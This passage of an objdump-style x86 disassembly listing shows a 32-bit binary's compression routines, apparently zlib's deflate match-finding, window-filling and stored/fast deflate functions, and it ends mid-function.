  403f10:	42                   	inc    %edx
  403f11:	8a 59 01             	mov    0x1(%ecx),%bl
  403f14:	41                   	inc    %ecx
  403f15:	42                   	inc    %edx
  403f16:	3a 1a                	cmp    (%edx),%bl
  403f18:	75 43                	jne    0x403f5d
  403f1a:	8a 59 01             	mov    0x1(%ecx),%bl
  403f1d:	41                   	inc    %ecx
  403f1e:	42                   	inc    %edx
  403f1f:	3a 1a                	cmp    (%edx),%bl
  403f21:	75 3a                	jne    0x403f5d
  403f23:	8a 59 01             	mov    0x1(%ecx),%bl
  403f26:	41                   	inc    %ecx
  403f27:	42                   	inc    %edx
  403f28:	3a 1a                	cmp    (%edx),%bl
  403f2a:	75 31                	jne    0x403f5d
  403f2c:	8a 59 01             	mov    0x1(%ecx),%bl
  403f2f:	41                   	inc    %ecx
  403f30:	42                   	inc    %edx
  403f31:	3a 1a                	cmp    (%edx),%bl
  403f33:	75 28                	jne    0x403f5d
  403f35:	8a 59 01             	mov    0x1(%ecx),%bl
  403f38:	41                   	inc    %ecx
  403f39:	42                   	inc    %edx
  403f3a:	3a 1a                	cmp    (%edx),%bl
  403f3c:	75 1f                	jne    0x403f5d
  403f3e:	8a 59 01             	mov    0x1(%ecx),%bl
  403f41:	41                   	inc    %ecx
  403f42:	42                   	inc    %edx
  403f43:	3a 1a                	cmp    (%edx),%bl
  403f45:	75 16                	jne    0x403f5d
  403f47:	8a 59 01             	mov    0x1(%ecx),%bl
  403f4a:	41                   	inc    %ecx
  403f4b:	42                   	inc    %edx
  403f4c:	3a 1a                	cmp    (%edx),%bl
  403f4e:	75 0d                	jne    0x403f5d
  403f50:	8a 59 01             	mov    0x1(%ecx),%bl
  403f53:	41                   	inc    %ecx
  403f54:	42                   	inc    %edx
  403f55:	3a 1a                	cmp    (%edx),%bl
  403f57:	75 04                	jne    0x403f5d
  403f59:	3b ce                	cmp    %esi,%ecx
  403f5b:	72 b4                	jb     0x403f11
  403f5d:	8b d1                	mov    %ecx,%edx
  403f5f:	2b d6                	sub    %esi,%edx
  403f61:	81 c2 02 01 00 00    	add    $0x102,%edx
  403f67:	3b d5                	cmp    %ebp,%edx
  403f69:	8d 8e fe fe ff ff    	lea    -0x102(%esi),%ecx
  403f6f:	7e 1a                	jle    0x403f8b
  403f71:	3b 54 24 14          	cmp    0x14(%esp),%edx
  403f75:	89 47 70             	mov    %eax,0x70(%edi)
  403f78:	8b ea                	mov    %edx,%ebp
  403f7a:	7d 2c                	jge    0x403fa8
  403f7c:	8a 5c 0a ff          	mov    -0x1(%edx,%ecx,1),%bl
  403f80:	8a 14 0a             	mov    (%edx,%ecx,1),%dl
  403f83:	88 5c 24 0e          	mov    %bl,0xe(%esp)
  403f87:	88 54 24 0f          	mov    %dl,0xf(%esp)
  403f8b:	8b 57 34             	mov    0x34(%edi),%edx
  403f8e:	23 d0                	and    %eax,%edx
  403f90:	8b 47 40             	mov    0x40(%edi),%eax
  403f93:	0f b7 04 50          	movzwl (%eax,%edx,2),%eax
  403f97:	3b 44 24 18          	cmp    0x18(%esp),%eax
  403f9b:	76 0b                	jbe    0x403fa8
  403f9d:	83 6c 24 10 01       	subl   $0x1,0x10(%esp)
  403fa2:	0f 85 2e ff ff ff    	jne    0x403ed6
  403fa8:	8b 47 74             	mov    0x74(%edi),%eax
  403fab:	3b e8                	cmp    %eax,%ebp
  403fad:	77 02                	ja     0x403fb1
  403faf:	8b c5                	mov    %ebp,%eax
  403fb1:	5e                   	pop    %esi
  403fb2:	5d                   	pop    %ebp
  403fb3:	5b                   	pop    %ebx
  403fb4:	83 c4 14             	add    $0x14,%esp
  403fb7:	c3                   	ret
  403fb8:	cc                   	int3
  403fb9:	cc                   	int3
  403fba:	cc                   	int3
  403fbb:	cc                   	int3
  403fbc:	cc                   	int3
  403fbd:	cc                   	int3
  403fbe:	cc                   	int3
  403fbf:	cc                   	int3
  403fc0:	8b 4e 38             	mov    0x38(%esi),%ecx
  403fc3:	8b 46 6c             	mov    0x6c(%esi),%eax
  403fc6:	55                   	push   %ebp
  403fc7:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  403fcb:	8a 14 29             	mov    (%ecx,%ebp,1),%dl
  403fce:	03 c1                	add    %ecx,%eax
  403fd0:	03 cd                	add    %ebp,%ecx
  403fd2:	57                   	push   %edi
  403fd3:	8d b8 02 01 00 00    	lea    0x102(%eax),%edi
  403fd9:	3a 10                	cmp    (%eax),%dl
  403fdb:	75 7a                	jne    0x404057
  403fdd:	8a 51 01             	mov    0x1(%ecx),%dl
  403fe0:	3a 50 01             	cmp    0x1(%eax),%dl
  403fe3:	75 72                	jne    0x404057
  403fe5:	83 c0 02             	add    $0x2,%eax
  403fe8:	83 c1 02             	add    $0x2,%ecx
  403feb:	eb 03                	jmp    0x403ff0
  403fed:	8d 49 00             	lea    0x0(%ecx),%ecx
  403ff0:	8a 50 01             	mov    0x1(%eax),%dl
  403ff3:	40                   	inc    %eax
  403ff4:	41                   	inc    %ecx
  403ff5:	3a 11                	cmp    (%ecx),%dl
  403ff7:	75 43                	jne    0x40403c
  403ff9:	8a 50 01             	mov    0x1(%eax),%dl
  403ffc:	40                   	inc    %eax
  403ffd:	41                   	inc    %ecx
  403ffe:	3a 11                	cmp    (%ecx),%dl
  404000:	75 3a                	jne    0x40403c
  404002:	8a 50 01             	mov    0x1(%eax),%dl
  404005:	40                   	inc    %eax
  404006:	41                   	inc    %ecx
  404007:	3a 11                	cmp    (%ecx),%dl
  404009:	75 31                	jne    0x40403c
  40400b:	8a 50 01             	mov    0x1(%eax),%dl
  40400e:	40                   	inc    %eax
  40400f:	41                   	inc    %ecx
  404010:	3a 11                	cmp    (%ecx),%dl
  404012:	75 28                	jne    0x40403c
  404014:	8a 50 01             	mov    0x1(%eax),%dl
  404017:	40                   	inc    %eax
  404018:	41                   	inc    %ecx
  404019:	3a 11                	cmp    (%ecx),%dl
  40401b:	75 1f                	jne    0x40403c
  40401d:	8a 50 01             	mov    0x1(%eax),%dl
  404020:	40                   	inc    %eax
  404021:	41                   	inc    %ecx
  404022:	3a 11                	cmp    (%ecx),%dl
  404024:	75 16                	jne    0x40403c
  404026:	8a 50 01             	mov    0x1(%eax),%dl
  404029:	40                   	inc    %eax
  40402a:	41                   	inc    %ecx
  40402b:	3a 11                	cmp    (%ecx),%dl
  40402d:	75 0d                	jne    0x40403c
  40402f:	8a 50 01             	mov    0x1(%eax),%dl
  404032:	40                   	inc    %eax
  404033:	41                   	inc    %ecx
  404034:	3a 11                	cmp    (%ecx),%dl
  404036:	75 04                	jne    0x40403c
  404038:	3b c7                	cmp    %edi,%eax
  40403a:	72 b4                	jb     0x403ff0
  40403c:	2b c7                	sub    %edi,%eax
  40403e:	05 02 01 00 00       	add    $0x102,%eax
  404043:	83 f8 03             	cmp    $0x3,%eax
  404046:	7c 0f                	jl     0x404057
  404048:	8b 4e 74             	mov    0x74(%esi),%ecx
  40404b:	89 6e 70             	mov    %ebp,0x70(%esi)
  40404e:	3b c1                	cmp    %ecx,%eax
  404050:	76 0a                	jbe    0x40405c
  404052:	5f                   	pop    %edi
  404053:	8b c1                	mov    %ecx,%eax
  404055:	5d                   	pop    %ebp
  404056:	c3                   	ret
  404057:	b8 02 00 00 00       	mov    $0x2,%eax
  40405c:	5f                   	pop    %edi
  40405d:	5d                   	pop    %ebp
  40405e:	c3                   	ret
  40405f:	cc                   	int3
  404060:	83 ec 08             	sub    $0x8,%esp
  404063:	53                   	push   %ebx
  404064:	55                   	push   %ebp
  404065:	8b 6e 2c             	mov    0x2c(%esi),%ebp
  404068:	57                   	push   %edi
  404069:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404070:	8b 7e 3c             	mov    0x3c(%esi),%edi
  404073:	2b 7e 74             	sub    0x74(%esi),%edi
  404076:	8b 46 6c             	mov    0x6c(%esi),%eax
  404079:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  40407c:	2b f8                	sub    %eax,%edi
  40407e:	8d 94 29 fa fe ff ff 	lea    -0x106(%ecx,%ebp,1),%edx
  404085:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  404089:	3b c2                	cmp    %edx,%eax
  40408b:	72 63                	jb     0x4040f0
  40408d:	8b 46 38             	mov    0x38(%esi),%eax
  404090:	55                   	push   %ebp
  404091:	8d 0c 28             	lea    (%eax,%ebp,1),%ecx
  404094:	51                   	push   %ecx
  404095:	50                   	push   %eax
  404096:	e8 b5 72 00 00       	call   0x40b350
  40409b:	8b 56 4c             	mov    0x4c(%esi),%edx
  40409e:	8b 46 44             	mov    0x44(%esi),%eax
  4040a1:	29 6e 70             	sub    %ebp,0x70(%esi)
  4040a4:	29 6e 6c             	sub    %ebp,0x6c(%esi)
  4040a7:	83 c4 0c             	add    $0xc,%esp
  4040aa:	29 6e 5c             	sub    %ebp,0x5c(%esi)
  4040ad:	8d 0c 50             	lea    (%eax,%edx,2),%ecx
  4040b0:	0f b7 41 fe          	movzwl -0x2(%ecx),%eax
  4040b4:	83 e9 02             	sub    $0x2,%ecx
  4040b7:	3b c5                	cmp    %ebp,%eax
  4040b9:	72 04                	jb     0x4040bf
  4040bb:	2b c5                	sub    %ebp,%eax
  4040bd:	eb 02                	jmp    0x4040c1
  4040bf:	33 c0                	xor    %eax,%eax
  4040c1:	83 ea 01             	sub    $0x1,%edx
  4040c4:	66 89 01             	mov    %ax,(%ecx)
  4040c7:	75 e7                	jne    0x4040b0
  4040c9:	8b 4e 40             	mov    0x40(%esi),%ecx
  4040cc:	8b d5                	mov    %ebp,%edx
  4040ce:	8d 0c 69             	lea    (%ecx,%ebp,2),%ecx
  4040d1:	0f b7 41 fe          	movzwl -0x2(%ecx),%eax
  4040d5:	83 e9 02             	sub    $0x2,%ecx
  4040d8:	3b c5                	cmp    %ebp,%eax
  4040da:	72 04                	jb     0x4040e0
  4040dc:	2b c5                	sub    %ebp,%eax
  4040de:	eb 02                	jmp    0x4040e2
  4040e0:	33 c0                	xor    %eax,%eax
  4040e2:	83 ea 01             	sub    $0x1,%edx
  4040e5:	66 89 01             	mov    %ax,(%ecx)
  4040e8:	75 e7                	jne    0x4040d1
  4040ea:	03 fd                	add    %ebp,%edi
  4040ec:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  4040f0:	8b 3e                	mov    (%esi),%edi
  4040f2:	83 7f 04 00          	cmpl   $0x0,0x4(%edi)
  4040f6:	0f 84 ab 00 00 00    	je     0x4041a7
  4040fc:	8b 46 74             	mov    0x74(%esi),%eax
  4040ff:	03 46 6c             	add    0x6c(%esi),%eax
  404102:	8b 4f 04             	mov    0x4(%edi),%ecx
  404105:	03 46 38             	add    0x38(%esi),%eax
  404108:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40410c:	8b d9                	mov    %ecx,%ebx
  40410e:	89 44 24 10          	mov    %eax,0x10(%esp)
  404112:	3b da                	cmp    %edx,%ebx
  404114:	76 02                	jbe    0x404118
  404116:	8b da                	mov    %edx,%ebx
  404118:	85 db                	test   %ebx,%ebx
  40411a:	74 4d                	je     0x404169
  40411c:	8b 57 1c             	mov    0x1c(%edi),%edx
  40411f:	2b cb                	sub    %ebx,%ecx
  404121:	89 4f 04             	mov    %ecx,0x4(%edi)
  404124:	8b 4a 18             	mov    0x18(%edx),%ecx
  404127:	83 f9 01             	cmp    $0x1,%ecx
  40412a:	75 0f                	jne    0x40413b
  40412c:	8b 07                	mov    (%edi),%eax
  40412e:	8b 4f 30             	mov    0x30(%edi),%ecx
  404131:	53                   	push   %ebx
  404132:	50                   	push   %eax
  404133:	51                   	push   %ecx
  404134:	e8 67 e3 ff ff       	call   0x4024a0
  404139:	eb 12                	jmp    0x40414d
  40413b:	83 f9 02             	cmp    $0x2,%ecx
  40413e:	75 17                	jne    0x404157
  404140:	8b 17                	mov    (%edi),%edx
  404142:	8b 47 30             	mov    0x30(%edi),%eax
  404145:	53                   	push   %ebx
  404146:	52                   	push   %edx
  404147:	50                   	push   %eax
  404148:	e8 33 ef ff ff       	call   0x403080
  40414d:	89 47 30             	mov    %eax,0x30(%edi)
  404150:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404154:	83 c4 0c             	add    $0xc,%esp
  404157:	8b 0f                	mov    (%edi),%ecx
  404159:	53                   	push   %ebx
  40415a:	51                   	push   %ecx
  40415b:	50                   	push   %eax
  40415c:	e8 ef 71 00 00       	call   0x40b350
  404161:	01 1f                	add    %ebx,(%edi)
  404163:	83 c4 0c             	add    $0xc,%esp
  404166:	01 5f 08             	add    %ebx,0x8(%edi)
  404169:	01 5e 74             	add    %ebx,0x74(%esi)
  40416c:	8b 7e 74             	mov    0x74(%esi),%edi
  40416f:	83 ff 03             	cmp    $0x3,%edi
  404172:	72 1f                	jb     0x404193
  404174:	8b 46 38             	mov    0x38(%esi),%eax
  404177:	8b 56 6c             	mov    0x6c(%esi),%edx
  40417a:	8b 4e 58             	mov    0x58(%esi),%ecx
  40417d:	03 d0                	add    %eax,%edx
  40417f:	0f b6 02             	movzbl (%edx),%eax
  404182:	89 46 48             	mov    %eax,0x48(%esi)
  404185:	d3 e0                	shl    %cl,%eax
  404187:	0f b6 4a 01          	movzbl 0x1(%edx),%ecx
  40418b:	33 c1                	xor    %ecx,%eax
  40418d:	23 46 54             	and    0x54(%esi),%eax
  404190:	89 46 48             	mov    %eax,0x48(%esi)
  404193:	81 ff 06 01 00 00    	cmp    $0x106,%edi
  404199:	73 0c                	jae    0x4041a7
  40419b:	8b 16                	mov    (%esi),%edx
  40419d:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
  4041a1:	0f 85 c9 fe ff ff    	jne    0x404070
  4041a7:	5f                   	pop    %edi
  4041a8:	5d                   	pop    %ebp
  4041a9:	5b                   	pop    %ebx
  4041aa:	83 c4 08             	add    $0x8,%esp
  4041ad:	c3                   	ret
  4041ae:	cc                   	int3
  4041af:	cc                   	int3
  4041b0:	51                   	push   %ecx
  4041b1:	53                   	push   %ebx
  4041b2:	56                   	push   %esi
  4041b3:	8b 74 24 10          	mov    0x10(%esp),%esi
  4041b7:	8b 46 0c             	mov    0xc(%esi),%eax
  4041ba:	83 c0 fb             	add    $0xfffffffb,%eax
  4041bd:	57                   	push   %edi
  4041be:	c7 44 24 0c ff ff 00 	movl   $0xffff,0xc(%esp)
  4041c5:	00 
  4041c6:	3d ff ff 00 00       	cmp    $0xffff,%eax
  4041cb:	73 04                	jae    0x4041d1
  4041cd:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4041d1:	8b 46 74             	mov    0x74(%esi),%eax
  4041d4:	83 f8 01             	cmp    $0x1,%eax
  4041d7:	77 10                	ja     0x4041e9
  4041d9:	e8 82 fe ff ff       	call   0x404060
  4041de:	8b 46 74             	mov    0x74(%esi),%eax
  4041e1:	85 c0                	test   %eax,%eax
  4041e3:	0f 84 36 01 00 00    	je     0x40431f
  4041e9:	01 46 6c             	add    %eax,0x6c(%esi)
  4041ec:	8b 4e 5c             	mov    0x5c(%esi),%ecx
  4041ef:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4041f3:	8b 56 6c             	mov    0x6c(%esi),%edx
  4041f6:	c7 46 74 00 00 00 00 	movl   $0x0,0x74(%esi)
  4041fd:	8d 04 01             	lea    (%ecx,%eax,1),%eax
  404200:	74 08                	je     0x40420a
  404202:	3b d0                	cmp    %eax,%edx
  404204:	0f 82 80 00 00 00    	jb     0x40428a
  40420a:	2b d0                	sub    %eax,%edx
  40420c:	89 56 74             	mov    %edx,0x74(%esi)
  40420f:	89 46 6c             	mov    %eax,0x6c(%esi)
  404212:	85 c9                	test   %ecx,%ecx
  404214:	7c 07                	jl     0x40421d
  404216:	8b 56 38             	mov    0x38(%esi),%edx
  404219:	03 d1                	add    %ecx,%edx
  40421b:	eb 02                	jmp    0x40421f
  40421d:	33 d2                	xor    %edx,%edx
  40421f:	6a 00                	push   $0x0
  404221:	2b c1                	sub    %ecx,%eax
  404223:	50                   	push   %eax
  404224:	52                   	push   %edx
  404225:	56                   	push   %esi
  404226:	e8 25 68 00 00       	call   0x40aa50
  40422b:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  40422e:	8b 3e                	mov    (%esi),%edi
  404230:	89 4e 5c             	mov    %ecx,0x5c(%esi)
  404233:	8b 47 1c             	mov    0x1c(%edi),%eax
  404236:	8b 58 14             	mov    0x14(%eax),%ebx
  404239:	8b 4f 10             	mov    0x10(%edi),%ecx
  40423c:	83 c4 10             	add    $0x10,%esp
  40423f:	3b d9                	cmp    %ecx,%ebx
  404241:	76 02                	jbe    0x404245
  404243:	8b d9                	mov    %ecx,%ebx
  404245:	85 db                	test   %ebx,%ebx
  404247:	74 35                	je     0x40427e
  404249:	8b 50 10             	mov    0x10(%eax),%edx
  40424c:	8b 47 0c             	mov    0xc(%edi),%eax
  40424f:	53                   	push   %ebx
  404250:	52                   	push   %edx
  404251:	50                   	push   %eax
  404252:	e8 f9 70 00 00       	call   0x40b350
  404257:	8b 47 1c             	mov    0x1c(%edi),%eax
  40425a:	01 5f 0c             	add    %ebx,0xc(%edi)
  40425d:	01 58 10             	add    %ebx,0x10(%eax)
  404260:	01 5f 14             	add    %ebx,0x14(%edi)
  404263:	29 5f 10             	sub    %ebx,0x10(%edi)
  404266:	8b 47 1c             	mov    0x1c(%edi),%eax
  404269:	29 58 14             	sub    %ebx,0x14(%eax)
  40426c:	8b 7f 1c             	mov    0x1c(%edi),%edi
  40426f:	83 c4 0c             	add    $0xc,%esp
  404272:	83 7f 14 00          	cmpl   $0x0,0x14(%edi)
  404276:	75 06                	jne    0x40427e
  404278:	8b 4f 08             	mov    0x8(%edi),%ecx
  40427b:	89 4f 10             	mov    %ecx,0x10(%edi)
  40427e:	8b 16                	mov    (%esi),%edx
  404280:	83 7a 10 00          	cmpl   $0x0,0x10(%edx)
  404284:	0f 84 8e 00 00 00    	je     0x404318
  40428a:	8b 56 5c             	mov    0x5c(%esi),%edx
  40428d:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  404290:	8b 46 2c             	mov    0x2c(%esi),%eax
  404293:	2b ca                	sub    %edx,%ecx
  404295:	2d 06 01 00 00       	sub    $0x106,%eax
  40429a:	3b c8                	cmp    %eax,%ecx
  40429c:	0f 82 2f ff ff ff    	jb     0x4041d1
  4042a2:	85 d2                	test   %edx,%edx
  4042a4:	7c 07                	jl     0x4042ad
  4042a6:	8b 46 38             	mov    0x38(%esi),%eax
  4042a9:	03 c2                	add    %edx,%eax
  4042ab:	eb 02                	jmp    0x4042af
  4042ad:	33 c0                	xor    %eax,%eax
  4042af:	6a 00                	push   $0x0
  4042b1:	51                   	push   %ecx
  4042b2:	50                   	push   %eax
  4042b3:	56                   	push   %esi
  4042b4:	e8 97 67 00 00       	call   0x40aa50
  4042b9:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  4042bc:	8b 3e                	mov    (%esi),%edi
  4042be:	89 4e 5c             	mov    %ecx,0x5c(%esi)
  4042c1:	8b 47 1c             	mov    0x1c(%edi),%eax
  4042c4:	8b 58 14             	mov    0x14(%eax),%ebx
  4042c7:	8b 4f 10             	mov    0x10(%edi),%ecx
  4042ca:	83 c4 10             	add    $0x10,%esp
  4042cd:	3b d9                	cmp    %ecx,%ebx
  4042cf:	76 02                	jbe    0x4042d3
  4042d1:	8b d9                	mov    %ecx,%ebx
  4042d3:	85 db                	test   %ebx,%ebx
  4042d5:	74 35                	je     0x40430c
  4042d7:	8b 50 10             	mov    0x10(%eax),%edx
  4042da:	8b 47 0c             	mov    0xc(%edi),%eax
  4042dd:	53                   	push   %ebx
  4042de:	52                   	push   %edx
  4042df:	50                   	push   %eax
  4042e0:	e8 6b 70 00 00       	call   0x40b350
  4042e5:	8b 47 1c             	mov    0x1c(%edi),%eax
  4042e8:	01 5f 0c             	add    %ebx,0xc(%edi)
  4042eb:	01 58 10             	add    %ebx,0x10(%eax)
  4042ee:	01 5f 14             	add    %ebx,0x14(%edi)
  4042f1:	29 5f 10             	sub    %ebx,0x10(%edi)
  4042f4:	8b 47 1c             	mov    0x1c(%edi),%eax
  4042f7:	29 58 14             	sub    %ebx,0x14(%eax)
  4042fa:	8b 7f 1c             	mov    0x1c(%edi),%edi
  4042fd:	83 c4 0c             	add    $0xc,%esp
  404300:	83 7f 14 00          	cmpl   $0x0,0x14(%edi)
  404304:	75 06                	jne    0x40430c
  404306:	8b 4f 08             	mov    0x8(%edi),%ecx
  404309:	89 4f 10             	mov    %ecx,0x10(%edi)
  40430c:	8b 16                	mov    (%esi),%edx
  40430e:	83 7a 10 00          	cmpl   $0x0,0x10(%edx)
  404312:	0f 85 b9 fe ff ff    	jne    0x4041d1
  404318:	5f                   	pop    %edi
  404319:	5e                   	pop    %esi
  40431a:	33 c0                	xor    %eax,%eax
  40431c:	5b                   	pop    %ebx
  40431d:	59                   	pop    %ecx
  40431e:	c3                   	ret
  40431f:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404323:	85 ff                	test   %edi,%edi
  404325:	74 f1                	je     0x404318
  404327:	8b 4e 5c             	mov    0x5c(%esi),%ecx
  40432a:	85 c9                	test   %ecx,%ecx
  40432c:	7c 07                	jl     0x404335
  40432e:	8b 46 38             	mov    0x38(%esi),%eax
  404331:	03 c1                	add    %ecx,%eax
  404333:	eb 02                	jmp    0x404337
  404335:	33 c0                	xor    %eax,%eax
  404337:	33 d2                	xor    %edx,%edx
  404339:	83 ff 04             	cmp    $0x4,%edi
  40433c:	0f 94 c2             	sete   %dl
  40433f:	52                   	push   %edx
  404340:	8b 56 6c             	mov    0x6c(%esi),%edx
  404343:	2b d1                	sub    %ecx,%edx
  404345:	52                   	push   %edx
  404346:	50                   	push   %eax
  404347:	56                   	push   %esi
  404348:	e8 03 67 00 00       	call   0x40aa50
  40434d:	8b 46 6c             	mov    0x6c(%esi),%eax
  404350:	89 46 5c             	mov    %eax,0x5c(%esi)
  404353:	8b 06                	mov    (%esi),%eax
  404355:	83 c4 10             	add    $0x10,%esp
  404358:	e8 63 ef ff ff       	call   0x4032c0
  40435d:	8b 0e                	mov    (%esi),%ecx
  40435f:	33 c0                	xor    %eax,%eax
  404361:	39 41 10             	cmp    %eax,0x10(%ecx)
  404364:	75 0f                	jne    0x404375
  404366:	83 ff 04             	cmp    $0x4,%edi
  404369:	0f 95 c0             	setne  %al
  40436c:	5f                   	pop    %edi
  40436d:	5e                   	pop    %esi
  40436e:	5b                   	pop    %ebx
  40436f:	48                   	dec    %eax
  404370:	83 e0 02             	and    $0x2,%eax
  404373:	59                   	pop    %ecx
  404374:	c3                   	ret
  404375:	83 ff 04             	cmp    $0x4,%edi
  404378:	0f 94 c0             	sete   %al
  40437b:	5f                   	pop    %edi
  40437c:	5e                   	pop    %esi
  40437d:	5b                   	pop    %ebx
  40437e:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
  404382:	59                   	pop    %ecx
  404383:	c3                   	ret
  404384:	cc                   	int3
  404385:	cc                   	int3
  404386:	cc                   	int3
  404387:	cc                   	int3
  404388:	cc                   	int3
  404389:	cc                   	int3
  40438a:	cc                   	int3
  40438b:	cc                   	int3
  40438c:	cc                   	int3
  40438d:	cc                   	int3
  40438e:	cc                   	int3
  40438f:	cc                   	int3
  404390:	53                   	push   %ebx
  404391:	55                   	push   %ebp
  404392:	56                   	push   %esi
  404393:	8b 74 24 10          	mov    0x10(%esp),%esi
  404397:	57                   	push   %edi
  404398:	33 db                	xor    %ebx,%ebx
  40439a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4043a0:	8b 46 74             	mov    0x74(%esi),%eax
  4043a3:	3d 06 01 00 00       	cmp    $0x106,%eax
  4043a8:	73 23                	jae    0x4043cd
  4043aa:	e8 b1 fc ff ff       	call   0x404060
  4043af:	8b 46 74             	mov    0x74(%esi),%eax
  4043b2:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4043b6:	3d 06 01 00 00       	cmp    $0x106,%eax
  4043bb:	73 08                	jae    0x4043c5
  4043bd:	85 ff                	test   %edi,%edi
  4043bf:	0f 84 d6 02 00 00    	je     0x40469b
  4043c5:	85 c0                	test   %eax,%eax
  4043c7:	0f 84 d5 02 00 00    	je     0x4046a2
  4043cd:	83 f8 03             	cmp    $0x3,%eax
  4043d0:	72 49                	jb     0x40441b
  4043d2:	8b 46 48             	mov    0x48(%esi),%eax
  4043d5:	8b 4e 58             	mov    0x58(%esi),%ecx
  4043d8:	8b 56 6c             	mov    0x6c(%esi),%edx
  4043db:	8b 7e 34             	mov    0x34(%esi),%edi
  4043de:	d3 e0                	shl    %cl,%eax
  4043e0:	8b 4e 38             	mov    0x38(%esi),%ecx
  4043e3:	0f b6 4c 11 02       	movzbl 0x2(%ecx,%edx,1),%ecx
  4043e8:	33 c1                	xor    %ecx,%eax
  4043ea:	23 46 54             	and    0x54(%esi),%eax
  4043ed:	8b 4e 44             	mov    0x44(%esi),%ecx
  4043f0:	89 46 48             	mov    %eax,0x48(%esi)
  4043f3:	66 8b 04 41          	mov    (%ecx,%eax,2),%ax
  4043f7:	23 fa                	and    %edx,%edi
  4043f9:	8b 56 40             	mov    0x40(%esi),%edx
  4043fc:	66 89 04 7a          	mov    %ax,(%edx,%edi,2)
  404400:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  404403:	23 4e 34             	and    0x34(%esi),%ecx
  404406:	8b 56 40             	mov    0x40(%esi),%edx
  404409:	0f b7 1c 4a          	movzwl (%edx,%ecx,2),%ebx
  40440d:	8b 46 48             	mov    0x48(%esi),%eax
  404410:	8b 4e 44             	mov    0x44(%esi),%ecx
  404413:	66 8b 56 6c          	mov    0x6c(%esi),%dx
  404417:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  40441b:	85 db                	test   %ebx,%ebx
  40441d:	74 36                	je     0x404455
  40441f:	8b 46 6c             	mov    0x6c(%esi),%eax
  404422:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  404425:	2b c3                	sub    %ebx,%eax
  404427:	81 e9 06 01 00 00    	sub    $0x106,%ecx
  40442d:	3b c1                	cmp    %ecx,%eax
  40442f:	77 24                	ja     0x404455
  404431:	8b 8e 88 00 00 00    	mov    0x88(%esi),%ecx
  404437:	83 f9 02             	cmp    $0x2,%ecx
  40443a:	0f 84 8e 00 00 00    	je     0x4044ce
  404440:	83 f9 03             	cmp    $0x3,%ecx
  404443:	0f 84 8a 00 00 00    	je     0x4044d3
  404449:	8b c3                	mov    %ebx,%eax
  40444b:	8b fe                	mov    %esi,%edi
  40444d:	e8 0e fa ff ff       	call   0x403e60
  404452:	89 46 60             	mov    %eax,0x60(%esi)
  404455:	bd 01 00 00 00       	mov    $0x1,%ebp
  40445a:	83 7e 60 03          	cmpl   $0x3,0x60(%esi)
  40445e:	0f 82 54 01 00 00    	jb     0x4045b8
  404464:	66 8b 56 6c          	mov    0x6c(%esi),%dx
  404468:	66 2b 56 70          	sub    0x70(%esi),%dx
  40446c:	8a 46 60             	mov    0x60(%esi),%al
  40446f:	8b be a4 16 00 00    	mov    0x16a4(%esi),%edi
  404475:	0f b7 ca             	movzwl %dx,%ecx
  404478:	8b 96 a0 16 00 00    	mov    0x16a0(%esi),%edx
  40447e:	66 89 0c 57          	mov    %cx,(%edi,%edx,2)
  404482:	8b 96 98 16 00 00    	mov    0x1698(%esi),%edx
  404488:	8b be a0 16 00 00    	mov    0x16a0(%esi),%edi
  40448e:	2c 03                	sub    $0x3,%al
  404490:	88 04 3a             	mov    %al,(%edx,%edi,1)
  404493:	01 ae a0 16 00 00    	add    %ebp,0x16a0(%esi)
  404499:	0f b6 c0             	movzbl %al,%eax
  40449c:	0f b6 90 d8 ed 41 00 	movzbl 0x41edd8(%eax),%edx
  4044a3:	66 01 ac 96 98 04 00 	add    %bp,0x498(%esi,%edx,4)
  4044aa:	00 
  4044ab:	8d 84 96 98 04 00 00 	lea    0x498(%esi,%edx,4),%eax
  4044b2:	81 c1 ff ff 00 00    	add    $0xffff,%ecx
  4044b8:	b8 00 01 00 00       	mov    $0x100,%eax
  4044bd:	66 3b c8             	cmp    %ax,%cx
  4044c0:	73 2f                	jae    0x4044f1
  4044c2:	0f b7 c9             	movzwl %cx,%ecx
  4044c5:	0f b6 81 d8 eb 41 00 	movzbl 0x41ebd8(%ecx),%eax
  4044cc:	eb 30                	jmp    0x4044fe
  4044ce:	83 f9 03             	cmp    $0x3,%ecx
  4044d1:	75 82                	jne    0x404455
  4044d3:	bd 01 00 00 00       	mov    $0x1,%ebp
  4044d8:	3b c5                	cmp    %ebp,%eax
  4044da:	0f 85 7a ff ff ff    	jne    0x40445a
  4044e0:	53                   	push   %ebx
  4044e1:	e8 da fa ff ff       	call   0x403fc0
  4044e6:	83 c4 04             	add    $0x4,%esp
  4044e9:	89 46 60             	mov    %eax,0x60(%esi)
  4044ec:	e9 69 ff ff ff       	jmp    0x40445a
  4044f1:	0f b7 d1             	movzwl %cx,%edx
  4044f4:	c1 ea 07             	shr    $0x7,%edx
  4044f7:	0f b6 82 d8 ec 41 00 	movzbl 0x41ecd8(%edx),%eax
  4044fe:	66 01 ac 86 88 09 00 	add    %bp,0x988(%esi,%eax,4)
  404505:	00 
  404506:	8b 86 9c 16 00 00    	mov    0x169c(%esi),%eax
  40450c:	33 c9                	xor    %ecx,%ecx
  40450e:	2b c5                	sub    %ebp,%eax
  404510:	39 86 a0 16 00 00    	cmp    %eax,0x16a0(%esi)
  404516:	8b 46 60             	mov    0x60(%esi),%eax
  404519:	0f 94 c1             	sete   %cl
  40451c:	29 46 74             	sub    %eax,0x74(%esi)
  40451f:	8b f9                	mov    %ecx,%edi
  404521:	8b 4e 74             	mov    0x74(%esi),%ecx
  404524:	3b 86 80 00 00 00    	cmp    0x80(%esi),%eax
